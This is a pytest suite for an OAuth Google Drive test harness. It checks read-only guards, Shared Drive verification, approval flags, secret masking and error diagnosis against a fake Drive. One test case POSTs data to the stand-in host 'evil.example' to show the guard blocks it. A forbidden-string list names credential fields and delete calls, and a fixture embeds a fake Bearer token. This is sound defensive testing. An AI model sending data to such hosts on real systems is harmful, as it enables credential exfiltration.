"""Tests of the OAuth live HARNESS (backend/drive_spike/run_oauth_live.py) and the authorization command (oauth_authorize.py).
They contact nothing: the fake Google / fake Drive stand in, and the refusal paths are proven to stop before any network or Drive call."""

import importlib.util
import json
import sys
from pathlib import Path

import httpx
import pytest

SPIKE_DIR = Path(__file__).resolve().parents[1] / "drive_spike"


def load(name: str):
    spec = importlib.util.spec_from_file_location(f"{name}_under_test", SPIKE_DIR / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    sys.path.insert(0, str(SPIKE_DIR))
    try:
        spec.loader.exec_module(module)
    finally:
        sys.path.remove(str(SPIKE_DIR))
    return module


@pytest.fixture()
def harness():
    return load("run_oauth_live")


@pytest.fixture()
def authorize_cli():
    return load("oauth_authorize")


def explode(*args, **kwargs):
    raise AssertionError("a network client was created: nothing may be contacted on this path")


# ---------------------------------------------------------------------------------------------------------------------- safety rails


def test_live_mode_refuses_without_explicit_write_approval_and_contacts_nothing(harness, tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(httpx, "Client", explode)
    out = tmp_path / "never-created"
    assert harness.main(["--live", "--out-dir", str(out)]) == 5
    assert "REFUSED" in capsys.readouterr().out and not out.exists()


@pytest.mark.parametrize("bad", ["D:/Bills/docs/oauth-out", "C:/Windows/Temp/oauth-out", "D:/SpincoTA-artifacts/scratch/oauth-out"])
def test_output_is_refused_anywhere_but_the_test_runs_root(harness, bad):
    with pytest.raises(SystemExit):
        harness.validate_out_dir(bad)
    assert not Path(bad).exists()


def test_the_harness_source_has_no_delete_capability_and_no_token_printing(harness):
    for path in (SPIKE_DIR / "run_oauth_live.py", SPIKE_DIR / "oauth_authorize.py"):
        source = path.read_text(encoding="utf-8")
        for forbidden in ('"DELETE"', "permanent_delete", "emptyTrash", ".unlink(", "rmtree", "os.remove", "refresh_token", "client_secret"):
            assert forbidden not in source, (path.name, forbidden)
        for line in source.splitlines():  # nothing that could carry a credential is ever printed
            if "print(" in line:
                assert not any(word in line for word in ("get_token", "refresh", "secret", "verifier", "access_token")), (path.name, line.strip())


def test_missing_configuration_blocks_the_live_run_before_any_drive_call(harness, tmp_path, monkeypatch):
    for name in ("SPINCO_GDRIVE_AUTH_MODE", "SPINCO_GDRIVE_ROOT_FOLDER_ID", "SPINCO_GDRIVE_OAUTH_CLIENT_FILE", "SPINCO_GDRIVE_OAUTH_TOKEN_FILE", "SPINCO_GDRIVE_CREDENTIALS_FILE"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setattr(httpx, "Client", explode)
    ctx = harness.Context("LIVE", tmp_path)
    assert harness.build(ctx) is False and "AUTH_MODE" in ctx.blocked_reason  # service-account is the default: this harness needs oauth_user to be requested


def test_a_service_account_default_is_never_used_by_the_oauth_harness(harness, tmp_path, monkeypatch):
    monkeypatch.setenv("SPINCO_GDRIVE_AUTH_MODE", "service_account")
    monkeypatch.setattr(httpx, "Client", explode)
    ctx = harness.Context("LIVE", tmp_path)
    assert harness.build(ctx) is False and "oauth_user" in ctx.blocked_reason


def test_an_unauthorized_token_file_blocks_before_any_drive_call(harness, tmp_path, monkeypatch):
    sys.path.insert(0, str(Path(__file__).parent))
    from drive_testkit import write_oauth_client_file

    monkeypatch.setenv("SPINCO_GDRIVE_AUTH_MODE", "oauth_user")
    monkeypatch.setenv("SPINCO_GDRIVE_ROOT_FOLDER_ID", "ROOTFOLDER0000001")
    monkeypatch.setenv("SPINCO_GDRIVE_OAUTH_CLIENT_FILE", str(write_oauth_client_file(tmp_path)))
    monkeypatch.setenv("SPINCO_GDRIVE_OAUTH_TOKEN_FILE", str(tmp_path / "not-yet.json"))
    monkeypatch.setattr(httpx, "Client", explode)
    ctx = harness.Context("LIVE", tmp_path)
    assert harness.build(ctx) is False and "not ready" in ctx.blocked_reason and "Authorize first" in ctx.blocked_reason


# --------------------------------------------------------------------------------------------------------------------- a fake run


def run_all(harness, tmp_path):
    ctx = harness.Context("FAKE", tmp_path)
    assert harness.build(ctx) is True, ctx.blocked_reason
    results = []
    for number, func in enumerate(harness.TESTS, start=1):
        result = harness.Result(number, func.__name__[4:])
        func(ctx, result)
        results.append(result)
    return ctx, results


def test_every_step_passes_against_the_fake_and_is_labelled_fake(harness, tmp_path):
    ctx, results = run_all(harness, tmp_path)
    statuses = {r.name: r.status for r in results}
    assert len(results) == len(harness.TESTS) == 11 and all(s in ("PASS", "PARTIAL") for s in statuses.values()), statuses
    assert all(r.evidence for r in results)
    sha = next(r for r in results if r.name == "download_sha256_and_range").evidence
    assert sha["sha256_equal"] and sha["sha256_uploaded"] == sha["sha256_downloaded"]
    report = harness.write_reports(ctx, __import__("datetime").datetime.now(__import__("datetime").timezone.utc))
    text = report.read_text(encoding="utf-8")
    assert report.name == "FAKE-oauth-report.md" and "NOT evidence about Google" in text and "drive.file" in text


def test_reports_contain_no_secret_token_or_email(harness, tmp_path):
    ctx, results = run_all(harness, tmp_path)
    harness.write_reports(ctx, __import__("datetime").datetime.now(__import__("datetime").timezone.utc))
    from drive_testkit import SYNTHETIC_CLIENT_SECRET

    token_file = json.loads(ctx.config.oauth_token_file.read_text(encoding="utf-8"))
    combined = "".join((tmp_path / name).read_text(encoding="utf-8") for name in ("FAKE-oauth-report.md", "FAKE-oauth-report.json"))
    for secret in (SYNTHETIC_CLIENT_SECRET, token_file["refresh_token"], "fake-token-oauth", "@"):
        assert secret not in combined, secret


def test_a_failure_in_one_step_is_reported_as_that_failure_not_as_a_missing_attribute(harness, tmp_path, monkeypatch):
    ctx = harness.Context("FAKE", tmp_path)
    assert harness.build(ctx)
    ctx.storage = type("S", (), {"upload": staticmethod(lambda *a, **k: (_ for _ in ()).throw(RuntimeError("synthetic upload failure")))})()
    with pytest.raises(RuntimeError, match="synthetic upload failure"):
        harness.t05_download_sha256_and_range(ctx, harness.Result(5, "x"))
    assert ctx.uploaded is None


# ------------------------------------------------------------------------------------------------------------ authorization command


def test_the_authorize_command_check_is_offline_and_prints_no_secret(authorize_cli, tmp_path, monkeypatch, capsys):
    sys.path.insert(0, str(Path(__file__).parent))
    from drive_testkit import SYNTHETIC_CLIENT_ID, SYNTHETIC_CLIENT_SECRET, write_oauth_client_file

    client = write_oauth_client_file(tmp_path)
    monkeypatch.setattr(httpx, "Client", explode)
    code = authorize_cli.main(["--check", "--client-file", str(client), "--token-file", str(tmp_path / "token.json")])
    out = capsys.readouterr().out
    report = json.loads(out[: out.rindex("}") + 1])
    assert code == 0 and report["client_file"]["valid"] is True and report["token_file"]["exists"] is False
    assert SYNTHETIC_CLIENT_SECRET not in out and SYNTHETIC_CLIENT_ID not in out and "--authorize" in out


def test_the_authorize_command_refuses_paths_inside_the_repository(authorize_cli, tmp_path, capsys):
    inside = Path(__file__).resolve().parents[1] / "token.json"
    assert authorize_cli.main(["--check", "--client-file", str(tmp_path / "c.json"), "--token-file", str(inside)]) == 2
    assert "OUTSIDE the repository" in capsys.readouterr().out


def test_the_authorize_command_needs_its_paths(authorize_cli, monkeypatch, capsys):
    monkeypatch.delenv("SPINCO_GDRIVE_OAUTH_CLIENT_FILE", raising=False)
    monkeypatch.delenv("SPINCO_GDRIVE_OAUTH_TOKEN_FILE", raising=False)
    assert authorize_cli.main(["--check"]) == 2
    assert "--client-file" in capsys.readouterr().out


def test_authorize_refuses_to_overwrite_an_existing_token_file(authorize_cli, tmp_path, monkeypatch, capsys):
    sys.path.insert(0, str(Path(__file__).parent))
    from drive_testkit import write_oauth_client_file

    token = tmp_path / "token.json"
    token.write_text("KEEP-ME", encoding="utf-8")
    monkeypatch.setattr(httpx, "Client", explode)
    code = authorize_cli.main(["--authorize", "--no-browser", "--client-file", str(write_oauth_client_file(tmp_path)), "--token-file", str(token)])
    assert code == 1 and "never overwritten" in capsys.readouterr().out and token.read_text(encoding="utf-8") == "KEEP-ME"


# ------------------------------------------------------------------------------------------------- read-only status + Shared Drive guard
# Everything below runs against the fake Google / fake Drive. It proves OUR checks behave as designed; it says nothing about Google itself.

OLD_MY_DRIVE_TEST_FOLDER = "1taDoIQnJyObDWWpUFQo_Q1WpvlLP6jz1"  # the temporary My Drive folder used in the first live experiments: it must never pass the guard
CONFIG_ENV = ("SPINCO_GDRIVE_AUTH_MODE", "SPINCO_GDRIVE_ROOT_FOLDER_ID", "SPINCO_GDRIVE_OAUTH_CLIENT_FILE", "SPINCO_GDRIVE_OAUTH_TOKEN_FILE", "SPINCO_GDRIVE_CREDENTIALS_FILE")


def make_ctx(harness, tmp_path, mode="FAKE-STATUS", target="shared-drive"):
    ctx = harness.Context(mode, tmp_path)
    ctx.fake_target = target
    assert harness.build(ctx) is True, ctx.blocked_reason
    return ctx


def drive_methods(ctx):
    return [entry["method"] for entry in ctx.fake[0].requests]


@pytest.fixture()
def cli(harness, tmp_path, monkeypatch):
    """The command line, with the report root moved into pytest's temp folder (the real one is D:\\SpincoTA-artifacts\\test-runs)."""
    monkeypatch.setattr(harness, "TEST_RUNS_ROOT", tmp_path)
    for name in CONFIG_ENV:
        monkeypatch.delenv(name, raising=False)
    return tmp_path / "run"


def test_the_expected_shared_drive_id_is_exactly_the_company_one(harness):
    assert harness.COMPANY_SHARED_DRIVE_ID == "0AC6JZ6F0PQY-Uk9PVA"


# ---- status mode

def test_status_reports_a_verified_shared_drive_and_writes_nothing(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    document = harness.run_status(ctx)
    target = document["target"]
    assert target["classification"] == "SHARED DRIVE" and target["matches_expected_shared_drive"] is True and target["verified_for_writes"] is True
    assert target["is_folder"] is True and target["can_add_children"] is True and target["refusal"] is None
    assert document["permissions"] == {"available": True, "by_type_and_role": {"user:writer": 1}, "public_link": False, "domain_wide": False}
    assert document["authentication"]["access_token_obtained"] is True and document["authentication"]["token_file_unchanged"] is True
    assert document["verdict"].startswith("VERIFIED") and "Nothing was written" in document["verdict"]
    assert set(drive_methods(ctx)) == {"GET"}  # the fake Drive itself only ever saw reads
    assert document["requests"]["refused_non_read_requests"] == 0 and document["requests"]["reads"] >= 2 and document["requests"]["token_endpoint_posts"] >= 1


def test_status_flags_a_publicly_shared_target(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    ctx.fake[0].permissions[ctx.config.root_folder_id] = [{"type": "user", "role": "writer"}, {"type": "anyone", "role": "reader"}]
    permissions = harness.run_status(ctx)["permissions"]
    assert permissions["public_link"] is True and permissions["by_type_and_role"] == {"anyone:reader": 1, "user:writer": 1}


def test_status_survives_an_unreadable_sharing_list(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    ctx.fake[0].fail_next(1, 403, "forbidden", match=lambda r: r.url.path.endswith("/permissions"))
    document = harness.run_status(ctx)
    assert document["permissions"]["available"] is False and "DrivePermissionError" in document["permissions"]["note"]
    assert document["target"]["verified_for_writes"] is True  # the missing sharing list does not change the target verdict


def test_status_output_holds_no_token_secret_or_email_address(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    ctx.fake[0].files[ctx.config.root_folder_id]["name"] = "ops@spinco.example Shared"  # even if a name contained an address, it is masked
    text = json.dumps(harness.run_status(ctx), default=str)
    from drive_testkit import SYNTHETIC_CLIENT_SECRET

    refresh = json.loads(ctx.config.oauth_token_file.read_text(encoding="utf-8"))["refresh_token"]
    for secret in (SYNTHETIC_CLIENT_SECRET, refresh, "fake-token", "@", "spinco.example"):
        assert secret not in text, secret
    assert "[masked]" in text


def test_the_status_path_never_reaches_a_write_function(harness):
    import inspect

    source = "".join(inspect.getsource(f) for f in (harness.run_status, harness.run_status_command, harness.inspect_target, harness.inspect_permissions))
    for name in ("create_folder", "upload", "update_file", "archive", "restore", "storage.", "ensure_uploaded", "t02_", "t03_"):
        assert name not in source, name


@pytest.mark.parametrize(
    "call",
    [
        lambda c: c.client.create_folder("x", c.config.root_folder_id, file_id="fakeid000000000001"),
        lambda c: c.client.upload_file(file_id="fakeid000000000002", name="x.pdf", parent_id=c.config.root_folder_id, content=b"%PDF-1.4"),
        lambda c: c.client.update_file(c.config.root_folder_id, trashed=True),
        lambda c: c.http.request("PUT", "https://www.googleapis.com/upload/drive/v3/files/x", content=b"x"),
        lambda c: c.http.request("PATCH", "https://www.googleapis.com/drive/v3/files/x", json={"name": "y"}),
        lambda c: c.http.request("DELETE", "https://www.googleapis.com/drive/v3/files/x"),
        lambda c: c.http.request("POST", "https://www.googleapis.com/drive/v3/files", json={"name": "y"}),
        lambda c: c.http.request("POST", "https://evil.example/token", data={"a": "b"}),  # a POST to anything but the configured token endpoint
    ],
)
def test_the_read_only_guard_refuses_every_write_before_it_is_sent(harness, tmp_path, call):
    ctx = make_ctx(harness, tmp_path)
    before = len(ctx.fake[0].requests)
    files_before = dict(ctx.fake[0].files)
    with pytest.raises(harness.ReadOnlyViolation):
        call(ctx)
    assert len(ctx.fake[0].requests) == before and ctx.fake[0].files == files_before  # nothing reached the (fake) Drive
    assert len(ctx.guard.blocked) == 1


def test_the_read_only_guard_lets_reads_and_the_token_refresh_through(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    posts_before = ctx.guard.token_posts
    ctx.provider.invalidate()
    assert ctx.client.get_raw(ctx.config.root_folder_id, "id")["id"] == ctx.config.root_folder_id
    assert ctx.guard.token_posts == posts_before + 1 and ctx.guard.blocked == []


def test_a_writing_run_is_not_read_only(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path, mode="FAKE", target="my-drive")
    assert ctx.guard is None and ctx.read_only is False


# ---- status command line

def test_status_command_prints_a_verified_report_and_saves_it(harness, cli, capsys):
    assert harness.main(["--fake-status", "--out-dir", str(cli)]) == 0
    out = capsys.readouterr().out
    document = json.loads(out)
    assert document["target"]["verified_for_writes"] is True and "NOT evidence about Google" in document["banner"]
    assert json.loads((cli / "FAKE-status-report.json").read_text(encoding="utf-8")) == document
    assert not any((cli / name).exists() for name in ("oauth-report.json", "FAKE-oauth-report.json"))  # no write-run report


@pytest.mark.parametrize("target", ["my-drive", "other-shared-drive"])
def test_status_command_refuses_a_target_that_is_not_the_company_shared_drive(harness, cli, capsys, target):
    assert harness.main(["--fake-status", "--fake-target", target, "--out-dir", str(cli)]) == 6
    document = json.loads(capsys.readouterr().out)
    assert document["verdict"].startswith("REFUSED") and document["target"]["verified_for_writes"] is False


def test_status_command_does_not_overwrite_an_earlier_report(harness, cli):
    assert harness.main(["--fake-status", "--out-dir", str(cli)]) == 0
    with pytest.raises(SystemExit):
        harness.main(["--fake-status", "--out-dir", str(cli)])


def test_status_needs_no_approval_and_refuses_the_write_flags(harness, cli):
    for flags in (["--approve-writes"], ["--require-shared-drive"]):
        with pytest.raises(SystemExit):
            harness.main(["--status", *flags])
    with pytest.raises(SystemExit):
        harness.main(["--fake-status"])  # the fake variant needs a folder for its fake files


def test_real_status_blocks_before_any_network_call_when_not_configured(harness, cli, monkeypatch, capsys):
    monkeypatch.setattr(httpx, "Client", explode)
    assert harness.main(["--status"]) == 3
    assert "BLOCKED" in capsys.readouterr().out


def test_real_status_with_an_unauthorized_token_file_blocks_before_any_network_call(harness, cli, tmp_path, monkeypatch, capsys):
    sys.path.insert(0, str(Path(__file__).parent))
    from drive_testkit import write_oauth_client_file

    monkeypatch.setenv("SPINCO_GDRIVE_AUTH_MODE", "oauth_user")
    monkeypatch.setenv("SPINCO_GDRIVE_ROOT_FOLDER_ID", harness.COMPANY_SHARED_DRIVE_ID)
    monkeypatch.setenv("SPINCO_GDRIVE_OAUTH_CLIENT_FILE", str(write_oauth_client_file(tmp_path)))
    monkeypatch.setenv("SPINCO_GDRIVE_OAUTH_TOKEN_FILE", str(tmp_path / "not-yet.json"))
    monkeypatch.setattr(httpx, "Client", explode)
    assert harness.main(["--status"]) == 3
    assert "Authorize first" in capsys.readouterr().out


# ---- the Shared Drive guard: target inspection

def scenario(harness, tmp_path, name):
    """A fake context plus the fake Drive, arranged so the configured root is wrong in one specific way (or right, for "company")."""
    from dataclasses import replace

    target = {"my-drive": "my-drive", "old-my-drive-folder": "my-drive", "other-shared-drive": "other-shared-drive"}.get(name, "shared-drive")
    ctx = make_ctx(harness, tmp_path, mode="FAKE", target=target)
    drive = ctx.fake[0]
    root = ctx.config.root_folder_id
    if name == "old-my-drive-folder":
        drive._add(OLD_MY_DRIVE_TEST_FOLDER, "Spinco TA Audit", "application/vnd.google-apps.folder", [])
        ctx.config = replace(ctx.config, root_folder_id=OLD_MY_DRIVE_TEST_FOLDER)
    elif name == "missing":
        ctx.config = replace(ctx.config, root_folder_id="NOSUCHFOLDER000001")
    elif name == "inaccessible":
        drive.fail_next(1, 403, "forbidden")
    elif name == "unverifiable-outage":
        drive.fail_next(50, 500, "backendError")
    elif name == "not-a-folder":
        drive._add("AFILENOTAFOLDER001", "x.pdf", "application/pdf", [root])
        ctx.config = replace(ctx.config, root_folder_id="AFILENOTAFOLDER001")
    elif name == "cannot-add-children":
        drive.files[root]["capabilities"]["canAddChildren"] = False
    elif name == "empty-drive-id":
        drive.files[root]["driveId"] = ""
    elif name == "garbage-metadata":
        ctx.client.get_raw = lambda *a, **k: ["not", "a", "dict"]
    elif name == "undecodable-answer":
        def broken(*a, **k):
            raise ValueError("not json")

        ctx.client.get_raw = broken
    return ctx


REFUSALS = [
    ("my-drive", "MY DRIVE"),
    ("old-my-drive-folder", "MY DRIVE"),
    ("other-shared-drive", "DIFFERENT Shared Drive"),
    ("missing", "not found"),
    ("inaccessible", "not allowed to read"),
    ("unverifiable-outage", "could not be verified"),
    ("not-a-folder", "not a folder"),
    ("cannot-add-children", "cannot add items"),
    ("empty-drive-id", "MY DRIVE"),
    ("garbage-metadata", "could not be verified"),
    ("undecodable-answer", "could not be verified"),
]


@pytest.mark.parametrize(("name", "expected_text"), REFUSALS)
def test_the_guard_refuses_everything_that_is_not_a_verified_company_shared_drive(harness, tmp_path, name, expected_text):
    ctx = scenario(harness, tmp_path, name)
    check = harness.inspect_target(ctx)
    assert check["verified_for_writes"] is False and expected_text in check["refusal"], check
    writes = [m for m in drive_methods(ctx) if m != "GET"]
    assert writes == []  # the check itself only ever read


def test_the_guard_passes_the_company_shared_drive(harness, tmp_path):
    ctx = scenario(harness, tmp_path, "company")
    check = harness.inspect_target(ctx)
    assert check["verified_for_writes"] is True and check["matches_expected_shared_drive"] is True and check["classification"] == "SHARED DRIVE"
    assert check["root_is_the_shared_drive_itself"] is True and check["refusal"] is None


def test_the_guard_compares_with_the_exact_expected_id(harness, tmp_path):
    ctx = scenario(harness, tmp_path, "company")
    assert harness.inspect_target(ctx, expected="0AC6JZ6F0PQY-Uk9PVB")["verified_for_writes"] is False  # one character different
    assert harness.inspect_target(ctx, expected=harness.COMPANY_SHARED_DRIVE_ID.lower())["verified_for_writes"] is False  # case matters


def test_a_refused_guard_blocks_the_run_and_nothing_was_written(harness, tmp_path):
    ctx = scenario(harness, tmp_path, "my-drive")
    assert harness.apply_write_guard(ctx) is False
    assert ctx.blocked_kind == "shared-drive" and "Nothing was written" in ctx.blocked_reason
    assert set(drive_methods(ctx)) == {"GET"} and ctx.fake[0].file_count() == 0


# ---- the Shared Drive guard: command line

def test_live_refuses_without_the_shared_drive_guard_flag_and_contacts_nothing(harness, cli, monkeypatch, capsys):
    monkeypatch.setattr(httpx, "Client", explode)
    assert harness.main(["--live", "--approve-writes", "--out-dir", str(cli)]) == 5
    assert "--require-shared-drive" in capsys.readouterr().out and not cli.exists()


def test_live_still_needs_the_explicit_write_approval_with_the_guard_flag(harness, cli, monkeypatch, capsys):
    monkeypatch.setattr(httpx, "Client", explode)
    assert harness.main(["--live", "--require-shared-drive", "--out-dir", str(cli)]) == 5
    assert "--approve-writes" in capsys.readouterr().out and not cli.exists()


def test_live_with_both_flags_but_no_configuration_blocks_before_any_drive_call(harness, cli, monkeypatch, capsys):
    monkeypatch.setattr(httpx, "Client", explode)
    assert harness.main(["--live", "--approve-writes", "--require-shared-drive", "--out-dir", str(cli)]) == 3
    report = json.loads((cli / "oauth-report.json").read_text(encoding="utf-8"))
    assert report["summary"] == {"BLOCKED": len(harness.TESTS)} and report["spike_folder"] is None


def test_the_fake_target_option_cannot_be_used_with_a_live_run(harness, cli):
    with pytest.raises(SystemExit):
        harness.main(["--live", "--approve-writes", "--require-shared-drive", "--fake-target", "my-drive", "--out-dir", str(cli)])


def test_a_fake_write_run_with_the_guard_verifies_first_and_then_passes_every_step(harness, cli):
    assert harness.main(["--fake", "--require-shared-drive", "--out-dir", str(cli)]) == 0
    report = json.loads((cli / "FAKE-oauth-report.json").read_text(encoding="utf-8"))
    assert report["target_check"]["verified_for_writes"] is True and report["target_check"]["classification"] == "SHARED DRIVE"
    assert report["summary"] == {"PASS": len(harness.TESTS)}
    assert report["spike_folder"].startswith("oauth-spike-")
    assert "Shared Drive guard" in (cli / "FAKE-oauth-report.md").read_text(encoding="utf-8")


@pytest.mark.parametrize("target", ["my-drive", "other-shared-drive"])
def test_a_fake_write_run_on_the_wrong_target_stops_before_any_write(harness, cli, target):
    assert harness.main(["--fake", "--require-shared-drive", "--fake-target", target, "--out-dir", str(cli)]) == 6
    report = json.loads((cli / "FAKE-oauth-report.json").read_text(encoding="utf-8"))
    assert report["summary"] == {"BLOCKED": len(harness.TESTS)} and report["spike_folder"] is None  # no step ran, so no folder or file was created
    assert report["target_check"]["verified_for_writes"] is False and "Shared Drive guard" in report["blocked_reason"]
    assert all(r["status"] == "BLOCKED" for r in report["results"])


def test_the_fake_write_run_without_the_guard_flag_is_unchanged(harness, cli):
    assert harness.main(["--fake", "--out-dir", str(cli)]) == 0  # the pre-existing behaviour (a My Drive style fake), kept as it was
    report = json.loads((cli / "FAKE-oauth-report.json").read_text(encoding="utf-8"))
    assert report["target_check"] is None


# ------------------------------------------------------------------------------------------- diagnosing a refused root read (read-only)
# The real status command once answered only "This account is not allowed to read the configured root." These tests pin down that the report now says
# what Google answered (status, reason, message), probes read-only to explain it, and never leaks a credential or an address.

PROJECT_NUMBER = "123456789012"
LEAKY = (
    f"Google Drive API has not been used in project {PROJECT_NUMBER} before or it is disabled. Signed in as ops@spinco.example, "
    "Authorization: Bearer ya29.A0AfH6SMBsecretsecretsecretsecretsecret"
)


def google_body(status, reason, google_status, *, message=LEAKY, detail_reason=None):
    error = {"code": status, "message": message, "errors": [{"message": message, "domain": "global", "reason": reason}], "status": google_status}
    if detail_reason:
        error["details"] = [{"@type": "type.googleapis.com/google.rpc.ErrorInfo", "reason": detail_reason}]
    return {"error": error}


def refuse_paths(ctx, matcher, body, status, reason, times=1):
    ctx.fake[0].fail_next(times, status, reason, match=matcher, body=body)


def root_path(ctx):
    return f"/drive/v3/files/{ctx.config.root_folder_id}"


def assert_clean(text):
    for leak in ("ya29", "Bearer", "ops@", "spinco.example", "secretsecret", "fake-token", "SYNTHETIC-CLIENT-SECRET"):
        assert leak not in text, leak


def test_the_exact_root_read_request_for_a_shared_drive(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    document = harness.run_status(ctx)
    sent = next(r for r in ctx.fake[0].requests if r["path"] == root_path(ctx))
    assert sent["method"] == "GET" and sent["query"]["supportsAllDrives"] == "true" and sent["query"]["fields"] == harness.ROOT_FIELDS
    for list_only in ("corpora", "includeItemsFromAllDrives", "driveId", "q"):  # parameters of files.list: meaningless (and wrong) on files.get
        assert list_only not in sent["query"]
    for personal in ("owners", "permissions", "emailAddress", "lastModifyingUser", "sharingUser"):
        assert personal not in sent["query"]["fields"]  # nothing personal is ever requested
    assert document["diagnosis"] is None and "google_error" not in document["target"]  # a healthy read adds no diagnostics and makes no extra request
    assert sum(1 for r in ctx.fake[0].requests if r["path"].startswith("/drive/v3/drives") or r["path"] == "/drive/v3/about") == 0


def test_a_refused_root_read_reports_googles_status_reason_and_safe_message(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    refuse_paths(ctx, lambda r: r.url.path == root_path(ctx), google_body(403, "forbidden", "PERMISSION_DENIED", detail_reason="SOMETHING"), 403, "forbidden")
    document = harness.run_status(ctx)
    error = document["target"]["google_error"]
    assert (error["http_status"], error["reason"], error["google_status"], error["detail_reason"]) == (403, "forbidden", "PERMISSION_DENIED", "SOMETHING")
    assert error["exception"] == "DrivePermissionError" and PROJECT_NUMBER in error["message"]
    refusal = document["target"]["refusal"]
    assert "HTTP 403" in refusal and "forbidden" in refusal and "PERMISSION_DENIED" in refusal and "not allowed to read" in refusal
    assert document["verdict"].startswith("REFUSED") and document["permissions"]["available"] is False
    assert_clean(json.dumps(document, default=str))


def test_the_report_tells_a_known_shared_drive_apart_from_a_refused_file_read(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    refuse_paths(ctx, lambda r: r.url.path == root_path(ctx), google_body(403, "forbidden", "PERMISSION_DENIED"), 403, "forbidden")
    diagnosis = harness.run_status(ctx)["diagnosis"]
    assert diagnosis["drive_api_answers_for_this_sign_in"]["ok"] is True
    drive = diagnosis["configured_id_is_a_shared_drive_this_account_can_open"]
    assert drive["ok"] is True and drive["can_add_children"] is True and drive["can_list_children"] is True and drive["name"] == "Spinco TA Audit"
    assert "IS a Shared Drive" in diagnosis["likely_cause"]


def test_the_report_recognises_a_disabled_drive_api(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    body = google_body(403, "accessNotConfigured", "PERMISSION_DENIED", detail_reason="SERVICE_DISABLED")
    refuse_paths(ctx, lambda r: r.url.path.startswith("/drive/v3/"), body, 403, "accessNotConfigured", times=3)  # the root read, `about` and `drives.get`
    document = harness.run_status(ctx)
    assert document["target"]["google_error"]["detail_reason"] == "SERVICE_DISABLED"
    assert document["diagnosis"]["drive_api_answers_for_this_sign_in"]["ok"] is False
    assert "switched off" in document["diagnosis"]["likely_cause"]
    assert_clean(json.dumps(document, default=str))


def test_the_report_recognises_a_missing_scope(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    body = google_body(403, "insufficientPermissions", "PERMISSION_DENIED", message="Request had insufficient authentication scopes.", detail_reason="ACCESS_TOKEN_SCOPE_INSUFFICIENT")
    refuse_paths(ctx, lambda r: r.url.path.startswith("/drive/v3/"), body, 403, "insufficientPermissions", times=3)
    assert "Drive scope" in harness.run_status(ctx)["diagnosis"]["likely_cause"]


def test_the_report_recognises_an_id_that_is_not_an_accessible_shared_drive(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    body = google_body(404, "notFound", "NOT_FOUND", message="File not found.")
    refuse_paths(ctx, lambda r: r.url.path in (root_path(ctx), f"/drive/v3/drives/{ctx.config.root_folder_id}"), body, 404, "notFound", times=2)
    document = harness.run_status(ctx)
    assert "not found" in document["target"]["refusal"] and document["target"]["google_error"]["http_status"] == 404
    assert "not a member" in document["diagnosis"]["likely_cause"]


def test_a_401_is_not_described_as_a_missing_permission(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    refuse_paths(ctx, lambda r: r.url.path == root_path(ctx), google_body(401, "authError", "UNAUTHENTICATED", message="Invalid Credentials"), 401, "authError", times=2)
    refusal = harness.run_status(ctx)["target"]["refusal"]
    assert "did not accept the sign-in" in refusal and "HTTP 401" in refusal and "not allowed" not in refusal


def test_an_id_google_calls_invalid_is_reported_with_its_400(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    refuse_paths(ctx, lambda r: r.url.path == root_path(ctx), google_body(400, "invalid", "INVALID_ARGUMENT", message="Invalid value for file id."), 400, "invalid")
    target = harness.run_status(ctx)["target"]
    assert target["google_error"]["http_status"] == 400 and "HTTP 400" in target["refusal"] and "invalid" in target["refusal"]


def test_an_id_with_forbidden_characters_is_refused_before_any_network_call(harness, cli, tmp_path, monkeypatch, capsys):
    sys.path.insert(0, str(Path(__file__).parent))
    from drive_testkit import write_oauth_client_file

    monkeypatch.setenv("SPINCO_GDRIVE_AUTH_MODE", "oauth_user")
    monkeypatch.setenv("SPINCO_GDRIVE_ROOT_FOLDER_ID", "not a valid id!")
    monkeypatch.setenv("SPINCO_GDRIVE_OAUTH_CLIENT_FILE", str(write_oauth_client_file(tmp_path)))
    monkeypatch.setenv("SPINCO_GDRIVE_OAUTH_TOKEN_FILE", str(tmp_path / "token.json"))
    monkeypatch.setattr(httpx, "Client", explode)
    assert harness.main(["--status"]) == 3
    assert "Drive folder id" in capsys.readouterr().out


def test_diagnosing_a_refusal_stays_read_only(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path)
    body = google_body(403, "accessNotConfigured", "PERMISSION_DENIED", detail_reason="SERVICE_DISABLED")
    refuse_paths(ctx, lambda r: r.url.path.startswith("/drive/v3/"), body, 403, "accessNotConfigured", times=3)
    files_before = dict(ctx.fake[0].files)
    document = harness.run_status(ctx)
    assert set(drive_methods(ctx)) == {"GET"} and ctx.fake[0].files == files_before
    assert document["requests"]["refused_non_read_requests"] == 0 and ctx.guard.blocked == []
    with pytest.raises(harness.ReadOnlyViolation):  # and the hook is still armed
        ctx.client.create_folder("x", ctx.config.root_folder_id, file_id="fakeid000000000009")


def test_the_diagnostic_code_never_reaches_a_write_function(harness):
    import inspect

    source = "".join(inspect.getsource(f) for f in (harness._probe, harness._likely_cause, harness.diagnose_root_failure, harness.google_error, harness._where))
    for name in ("create_folder", "upload", "update_file", "archive", "restore", "storage.", "ensure_uploaded", "POST", "PATCH", "PUT"):
        assert name not in source, name


def test_the_write_guard_records_googles_answer_and_writes_nothing(harness, tmp_path):
    ctx = make_ctx(harness, tmp_path, mode="FAKE", target="shared-drive")
    refuse_paths(ctx, lambda r: r.url.path == root_path(ctx), google_body(403, "forbidden", "PERMISSION_DENIED"), 403, "forbidden")
    assert harness.apply_write_guard(ctx) is False
    assert ctx.target_check["google_error"]["http_status"] == 403 and "HTTP 403" in ctx.blocked_reason and "Nothing was written" in ctx.blocked_reason
    assert set(drive_methods(ctx)) == {"GET"} and ctx.fake[0].file_count() == 0
